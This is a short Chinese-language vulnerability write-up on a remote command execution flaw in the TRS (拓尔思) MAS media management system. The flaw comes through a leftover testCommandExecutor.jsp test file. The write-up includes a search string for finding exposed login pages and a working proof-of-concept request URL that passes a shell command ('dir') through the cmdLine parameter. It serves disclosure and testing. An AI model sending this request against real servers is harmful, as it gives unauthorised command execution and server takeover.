# 拓尔思 MAS testCommandExecutor.jsp 远程命令执行漏洞

## 漏洞描述

拓尔思 MAS testCommandExecutor.jsp测试文件存在远程命令执行漏洞，当网站运维者未删除测试文件时，攻击者通过漏洞可以获取服务器权限

## 漏洞影响

<a-checkbox checked>拓尔思-MAS</a-checkbox></br>

## 网络测绘

<a-checkbox checked>"MAS媒资管理系统登录页面"</a-checkbox></br>

## 漏洞复现

主页面

![img](../../../.vuepress/public/img/1651159019976-6d273e4e-49cc-4141-8ffd-a4618948b494.png)

验证POC

```java
/mas/front/vod/main.do?method=newList&view=forward:/sysinfo/testCommandExecutor.jsp&cmdLine=dir&workDir=&pathEnv=&libPathEnv=
```

![img](../../../.vuepress/public/img/1651194412574-f6cbf86c-77a7-4495-afad-8daa67cdc968.png)